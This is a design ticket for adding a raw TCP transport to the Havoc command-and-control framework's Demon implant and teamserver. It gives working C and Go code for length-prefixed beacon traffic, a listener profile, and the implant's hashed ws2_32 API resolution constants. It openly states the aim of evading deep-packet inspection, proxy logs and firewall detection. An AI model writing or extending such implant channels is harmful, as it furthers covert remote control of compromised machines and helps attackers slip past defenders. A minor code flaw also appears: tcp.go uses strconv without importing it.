# HVC-013 — Raw TCP Transport

**Status:** Pending

---

## Problem

Havoc currently supports HTTP/HTTPS, SMB, and DNS transports, all compiled at build-time via `#ifdef`. There is no raw TCP transport.

HTTP adds mandatory framing (verb, headers, status line) that is trivially identified by deep-packet inspection, HTTP proxy logs, and NGFW application layer decoders. In environments where the operator already has a TCP tunnel or port-forward into the target network — e.g. via SSH `-L`, a SOCKS proxy, or a redirector that speaks raw TCP — the HTTP framing is noise that triggers detections and incurs unnecessary overhead.

A raw TCP transport lets the beacon send and receive payloads over a plain TCP stream with a minimal 4-byte length-prefix frame. The encoded payload inside the frame is identical to the HTTP POST body (base64, AES-256-CTR, HMAC-SHA256), so no crypto or encoding changes are required. TCP traffic on port 443 is frequently allowed through firewalls, and without HTTP framing it cannot be parsed by HTTP-aware inspection engines. It also fits naturally inside port-forwarded channels where the operator controls both ends.

---

## Scope

All changes are additive and gated behind `#ifdef TRANSPORT_TCP` on the Demon side and a `LISTENER_TCP` constant on the teamserver side. No existing transports are modified.

**Demon (agent):**
- New file: `payloads/Demon/src/core/TransportTcp.c`
- New file: `payloads/Demon/include/core/TransportTcp.h`
- Edit: `payloads/Demon/src/core/Transport.c` — add `TRANSPORT_TCP` branch
- Edit: `payloads/Demon/include/Demon.h` — the ws2_32 function pointers (`WSAStartup`, `WSACleanup`, `WSASocketA`, `connect`, `send`, `recv`, `closesocket`, `getaddrinfo`, `freeaddrinfo`) are **already present** in the `Win32` struct and resolved in `RtWs2_32()` in `Runtime.c`; no new pointers are needed
- Edit: `payloads/Demon/CMakeLists.txt` — add `TransportTcp.c` to source list; activate `ws2_32` link under `TRANSPORT_TCP`

**Teamserver:**
- New file: `teamserver/pkg/handlers/tcp.go`
- Edit: `teamserver/pkg/handlers/types.go` — add `LISTENER_TCP` constant and `AGENT_TCP` string

**Profile:**
- Edit: `teamserver/pkg/profile/config.go` — add `ListenerTCP` struct and wire it into `Listeners`

**Builder:**
- Edit: `teamserver/pkg/common/builder/builder.go` — handle `TRANSPORT_TCP` define in `PatchConfig()`

**Client:**
- Edit: `client/src/UserInterface/Dialogs/Listener.cc` — add TCP type to listener type selector
- Edit: `client/include/UserInterface/Dialogs/Listener.hpp` — add TCP-specific UI fields

---

## Design

### Wire Format

TCP provides a reliable byte stream with no inherent message boundaries. A 4-byte big-endian length prefix is written before every payload frame:

```
[LENGTH ] 4 bytes, big-endian — byte count of the ENCODED payload that follows
[PAYLOAD] LENGTH bytes — base64( IV(16 bytes) + AES-256-CTR-ciphertext + HMAC-SHA256(32 bytes) )
```

This is exactly the same encoded blob that appears in an HTTP POST body. The only structural difference from HTTP is the absence of HTTP headers and the presence of the length prefix. Both the send and receive paths use this layout, so the Demon always writes a length prefix before each outbound frame and always reads the 4-byte prefix first before allocating and reading the payload.

Never omit the length prefix. Without it the stream has no framing and reads will be ambiguous.

### Demon Side — `TransportTcp.c`

**Existing Win32 resolution (no new hashes needed):**

All required ws2_32.dll functions are already declared in `Demon.h` and resolved in `Runtime.c:RtWs2_32()`. The relevant pointers and their pre-existing hash constants in `Defines.h` are:

| Function pointer | Hash constant | Value |
|---|---|---|
| `Instance->Win32.WSAStartup` | `H_FUNC_WSASTARTUP` | `0x142e89c3` |
| `Instance->Win32.WSACleanup` | `H_FUNC_WSACLEANUP` | `0x32206eb8` |
| `Instance->Win32.WSASocketA` | `H_FUNC_WSASOCKETA` | `0x08a4d8fa` |
| `Instance->Win32.connect` | `H_FUNC_CONNECT` | `0xe73478ef` |
| `Instance->Win32.send` | `H_FUNC_SEND` | `0x7c8bc2cf` |
| `Instance->Win32.recv` | `H_FUNC_RECV` | `0x7c8b3515` |
| `Instance->Win32.closesocket` | `H_FUNC_CLOSESOCKET` | `0x185953a4` |
| `Instance->Win32.getaddrinfo` | `H_FUNC_GETADDRINFO` | `0x4b91706c` |
| `Instance->Win32.freeaddrinfo` | `H_FUNC_FREEADDRINFO` | `0x0307204e` |

`htons` is not dynamically resolved in this codebase. The port number is stored in the config as a host-order `DWORD` and converted at use-time via the compiler-intrinsic macro `htons()` from `winsock2.h` (already included transitively through `Demon.h`). Do not add a dynamic stub for `htons`.

`ws2_32.dll` is loaded on-demand by `RtWs2_32()` (already implemented in `Runtime.c`). Call it before the first `TcpConnect()` if `Instance->Modules.Ws2_32` is NULL.

**Key functions to implement:**

```c
/* Connect to host:port. Returns socket handle or INVALID_SOCKET on failure. */
SOCKET TcpConnect( LPSTR Host, WORD Port );

/* Send a framed payload: write 4-byte BE length then Len bytes of Data.
   Returns TRUE on success. */
BOOL TcpSend( SOCKET Sock, PBYTE Data, DWORD Len );

/* Receive a framed payload: read 4-byte BE length, allocate, read that many bytes.
   Caller frees *BufOut via Instance->Win32.RtlFreeHeap.
   Returns number of bytes read, or 0 on error. */
DWORD TcpRecv( SOCKET Sock, PBYTE* BufOut );

/* Close the socket cleanly. */
VOID TcpDisconnect( SOCKET Sock );
```

**Host resolution:** use `getaddrinfo` (already resolved) rather than `inet_addr` / `gethostbyname`. Pass `AF_INET`, `SOCK_STREAM`, `IPPROTO_TCP`.

**Reconnect / host rotation:** follow the same pattern as `TransportHttp.c` — maintain a host index, rotate on failure (round-robin or random per profile config), retry `Config.Transport.TCP.Retries` times before giving up and sleeping the normal jitter interval.

**Frame send implementation:**

```c
BOOL TcpSend( SOCKET Sock, PBYTE Data, DWORD Len ) {
    BYTE LenBuf[4];
    LenBuf[0] = (Len >> 24) & 0xFF;
    LenBuf[1] = (Len >> 16) & 0xFF;
    LenBuf[2] = (Len >>  8) & 0xFF;
    LenBuf[3] = (Len      ) & 0xFF;

    if ( Instance->Win32.send( Sock, (char*)LenBuf, 4, 0 ) != 4 )
        return FALSE;
    if ( Instance->Win32.send( Sock, (char*)Data, Len, 0 ) != (int)Len )
        return FALSE;
    return TRUE;
}
```

**Frame receive implementation:**

```c
DWORD TcpRecv( SOCKET Sock, PBYTE* BufOut ) {
    BYTE   LenBuf[4] = {0};
    DWORD  Total     = 0;
    int    Got       = 0;

    /* Read exactly 4 bytes for the length prefix */
    while ( Total < 4 ) {
        Got = Instance->Win32.recv( Sock, (char*)LenBuf + Total, 4 - Total, 0 );
        if ( Got <= 0 ) return 0;
        Total += Got;
    }

    DWORD PayloadLen = ((DWORD)LenBuf[0] << 24) | ((DWORD)LenBuf[1] << 16)
                     | ((DWORD)LenBuf[2] <<  8) |  (DWORD)LenBuf[3];

    if ( PayloadLen == 0 || PayloadLen > 0x1000000 ) /* 16 MB sanity cap */
        return 0;

    PBYTE Buf = Instance->Win32.RtlAllocateHeap( Instance->HeapHandle, HEAP_ZERO_MEMORY, PayloadLen );
    if ( !Buf ) return 0;

    Total = 0;
    while ( Total < PayloadLen ) {
        Got = Instance->Win32.recv( Sock, (char*)Buf + Total, PayloadLen - Total, 0 );
        if ( Got <= 0 ) {
            Instance->Win32.RtlFreeHeap( Instance->HeapHandle, 0, Buf );
            return 0;
        }
        Total += Got;
    }

    *BufOut = Buf;
    return PayloadLen;
}
```

**Integration in `Transport.c`:**

Add a `#ifdef TRANSPORT_TCP` branch in `TransportInit`, `TransportSend`, and `TransportRecv` alongside the existing HTTP / SMB / DNS branches. The TCP branch should store its active socket handle in a file-static or instance-level field (mirrors the pattern used for the SMB pipe handle).

### Teamserver Side — `teamserver/pkg/handlers/tcp.go`

The TCP handler accepts connections on a configured bind address and port, reads frames from each connection, passes the decoded body to `parseAgentRequest` (defined in `handlers/handlers.go`, already used by `http.go` and `dns.go`), and writes the response frame back.

Structure:

```go
package handlers

import (
    "encoding/binary"
    "io"
    "net"

    "Havoc/pkg/agent"
    "Havoc/pkg/profile"
)

type TCP struct {
    Teamserver agent.TeamServer
    Config     *profile.ListenerTCP
    listener   net.Listener
}

func (t *TCP) Start() {
    var err error
    t.listener, err = net.Listen("tcp", t.Config.HostBind+":"+strconv.Itoa(t.Config.PortBind))
    if err != nil { /* log and return */ return }

    pk := t.Teamserver.ListenerAdd("", LISTENER_TCP, t)
    /* broadcast pk to clients */
    _ = pk

    for {
        conn, err := t.listener.Accept()
        if err != nil { break }
        go t.handleConn(conn)
    }
}

func (t *TCP) handleConn(conn net.Conn) {
    defer conn.Close()
    ExternalIP, _, _ := net.SplitHostPort(conn.RemoteAddr().String())

    for {
        /* Read 4-byte big-endian length prefix */
        var length uint32
        if err := binary.Read(conn, binary.BigEndian, &length); err != nil {
            return
        }
        if length == 0 || length > 0x1000000 { return }

        body := make([]byte, length)
        if _, err := io.ReadFull(conn, body); err != nil { return }

        response, ok := parseAgentRequest(t.Teamserver, body, ExternalIP, false, t.Config.Name)
        if !ok { return }

        /* Write 4-byte big-endian length prefix + response */
        respBytes := response.Bytes()
        if err := binary.Write(conn, binary.BigEndian, uint32(len(respBytes))); err != nil { return }
        if _, err := conn.Write(respBytes); err != nil { return }
    }
}
```

`parseAgentRequest` is the same function used by `http.go` — no duplication of packet parsing logic.

### Profile — `teamserver/pkg/profile/config.go`

Add `ListenerTCP` to the `Listeners` struct and define the new type. The struct uses the same YAOTL tags as the existing listener types:

```go
type ListenerTCP struct {
    Name         string   `yaotl:"Name"`
    Hosts        []string `yaotl:"Hosts"`
    HostBind     string   `yaotl:"HostBind"`
    PortBind     int      `yaotl:"PortBind"`
    PortConn     int      `yaotl:"PortConn,optional"`
    KillDate     string   `yaotl:"KillDate,optional"`
    WorkingHours string   `yaotl:"WorkingHours,optional"`
}
```

Add it to `Listeners`:

```go
type Listeners struct {
    ListenerHTTP     []*ListenerHTTP     `yaotl:"Http,block"`
    ListenerSMB      []*ListenerSMB      `yaotl:"Smb,block"`
    ListenerExternal []*ListenerExternal `yaotl:"External,block"`
    ListenerDNS      []*ListenerDNS      `yaotl:"Dns,block"`
    ListenerTCP      []*ListenerTCP      `yaotl:"Tcp,block"`   // new
}
```

Example profile block:

```
Listeners {
    Tcp "tcp-redirector" {
        Hosts    = ["192.168.1.10", "10.0.0.1"]
        HostBind = "0.0.0.0"
        PortBind = 4444
        PortConn = 4444
    }
}
```

### Builder — `teamserver/pkg/common/builder/builder.go`

In `PatchConfig()`, add a `TRANSPORT_TCP` branch alongside the existing transport blocks (around line 1374). Pack the config using `AddWString` / `AddInt32` in the same order that `Demon.c:DemonConfig()` will read them:

```go
case "TCP":
    defines = append(defines, "TRANSPORT_TCP")
    // Config layout for TCP transport (Demon reads in this order):
    DemonConfig.AddInt32(WorkingHours)
    DemonConfig.AddInt32(int32(len(Config.Config.Hosts)))
    for _, host := range Config.Config.Hosts {
        DemonConfig.AddWString(host)
    }
    DemonConfig.AddInt32(int32(Config.Config.PortConn))
```

Add `LISTENER_TCP = 6` and `AGENT_TCP = "Tcp"` to `types.go`.

### Client — `Listener.cc` / `Listener.hpp`

Add TCP as a selectable listener type in the type combo box alongside HTTP, SMB, and DNS. The TCP form needs: host list, bind address, bind port, and connect port — same fields as HTTP minus TLS/cert/proxy/URI options. Use the existing `StackedWidget` pattern from the HTTP/DNS forms.

---

## File Map

| File | Change |
|------|--------|
| `payloads/Demon/src/core/TransportTcp.c` | New — TCP transport: `TcpConnect`, `TcpSend`, `TcpRecv`, `TcpDisconnect` |
| `payloads/Demon/include/core/TransportTcp.h` | New — declarations for the above functions |
| `payloads/Demon/src/core/Transport.c` | Add `#ifdef TRANSPORT_TCP` branch in `TransportInit`, `TransportSend`, `TransportRecv` |
| `payloads/Demon/include/Demon.h` | No change needed — ws2_32 pointers already exist |
| `payloads/Demon/include/common/Defines.h` | No change needed — all required hash constants already exist |
| `payloads/Demon/src/core/Runtime.c` | No change needed — `RtWs2_32()` already resolves all needed functions |
| `payloads/Demon/CMakeLists.txt` | Add `TransportTcp.c` to source list; add `ws2_32` link target under `TRANSPORT_TCP` guard |
| `teamserver/pkg/handlers/tcp.go` | New — TCP listener goroutine |
| `teamserver/pkg/handlers/types.go` | Add `LISTENER_TCP = 6` and `AGENT_TCP = "Tcp"` |
| `teamserver/pkg/profile/config.go` | Add `ListenerTCP` struct; add `ListenerTCP` field to `Listeners` |
| `teamserver/pkg/common/builder/builder.go` | Handle `TRANSPORT_TCP` define and config packing in `PatchConfig()` |
| `client/src/UserInterface/Dialogs/Listener.cc` | Add TCP type to listener type selector and form page |
| `client/include/UserInterface/Dialogs/Listener.hpp` | Add TCP-specific UI field declarations |

---

## Tests

**Teamserver — `teamserver/pkg/handlers/tcp_test.go`:**

```go
func TestTCPFrameRoundtrip(t *testing.T) {
    // Start a TCP handler on a random loopback port
    // Dial it from the test
    // Send a valid 4-byte length prefix + a minimal agent registration frame
    // Read back the 4-byte length prefix + response
    // Assert response length prefix matches actual response length
    // Assert response body is non-empty (parseAgentRequest succeeded)
}
```

**Demon side:** No unit test framework exists in the Demon. Compile-time verification: build the Demon with `-DTRANSPORT_TCP` and confirm link succeeds with `ws2_32`. Functional test: run the teamserver with a TCP listener and verify the Demon checks in.

---

## Notes

- **4-byte length prefix is mandatory.** TCP is a stream protocol with no message boundaries. Removing the prefix makes framing ambiguous and will cause silent data corruption.

- **No TLS.** Raw TCP intentionally has no TLS wrapper. WinHTTP (which provides the TLS stack in `TransportHttp.c`) is a per-request abstraction and does not expose a persistent TLS stream socket. TCP transport is designed for environments where the channel is already secured — a port-forwarded SSH tunnel, SOCKS proxy, or a TLS-terminating redirector. Document this clearly in profile comments.

- **Dynamic module loading.** Even though `ws2_32.dll` is almost universally present on Windows, load it via `LdrModuleLoad` per Demon convention. `RtWs2_32()` already does this — call it before the first use.

- **No new hash constants needed.** All ws2_32 function hashes required by TCP transport are already defined in `Defines.h`. Verify this before adding duplicates:
  - `H_FUNC_WSASTARTUP = 0x142e89c3`
  - `H_FUNC_WSACLEANUP = 0x32206eb8`
  - `H_FUNC_WSASOCKETA = 0x08a4d8fa`
  - `H_FUNC_CONNECT = 0xe73478ef`
  - `H_FUNC_SEND = 0x7c8bc2cf`
  - `H_FUNC_RECV = 0x7c8b3515`
  - `H_FUNC_CLOSESOCKET = 0x185953a4`
  - `H_FUNC_GETADDRINFO = 0x4b91706c`
  - `H_FUNC_FREEADDRINFO = 0x0307204e`

- **`htons` is a macro, not a dynamic stub.** In the MinGW headers used by this toolchain, `htons` is either an inline function or a preprocessor macro. Use it directly — do not create a `WIN_FUNC(htons)` pointer.

- **Sanity cap on received length.** Always validate that the 4-byte length value is non-zero and below a reasonable ceiling (16 MB is used in the `TcpRecv` sketch above). An unauthenticated attacker who can reach the TCP listener could otherwise cause a large heap allocation.

- **Connection state.** The Demon holds a single active socket. If `send` or `recv` returns an error, close the socket, select the next host from the rotation, and reconnect on the next beacon interval. Do not attempt to reconnect within the same callback — follow the same flow as `TransportHttp.c`.
